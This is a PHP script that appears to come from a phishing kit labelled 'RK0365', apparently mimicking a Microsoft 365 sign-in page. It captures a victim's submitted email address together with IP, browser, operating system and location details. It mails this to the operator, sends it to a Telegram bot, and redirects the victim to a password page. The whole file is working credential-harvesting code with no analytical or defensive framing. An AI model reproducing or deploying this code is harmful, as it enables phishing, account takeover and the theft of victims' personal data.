<?php
session_start();
include('settings.php');
include('email.php');

# Fucntions

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   
    }else{
        echo header('HTTP/1.0 404 not found');
    }


$InfoDATE   = date("d-m-Y h:i:sa");
$email = $_SESSION['email'] = $_POST['email'];
if(isset($_POST['email']) && $_POST['email']!='') {
    $message .= '
********** [ New Visitor {$IP} ] **********

(EMAIL ADDRESS) : '.$_POST['email'].'

';
$message .= ":: New Visitor  {$IP} ::";
$message .= "# USERAGENT  : {$useragent}\n";
$message .= "# BROWSER    : {$browser}\n";
$message .= "# OS         : {$os}\n";
$message .="";
$message .= "********** [  VISITOR DETAILS  ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "# CITY(IP)   : {$city}\n";
$message .= "# TIMEZONE   : {$timezone}, {$exact}\n";
$message .= "# COUNTRY    : {$countryname}, {$countrycode}\n";
$message .= "# DATE       : {$date}\n";
$message .= "********** [ RK0365 @ 2024 ] **********\n";


## Email Send ##
$subject = "New Visitor ($IP)";
$headers = "From: $IP";
@mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );

header("location: ../pass.php");
exit();
}
?>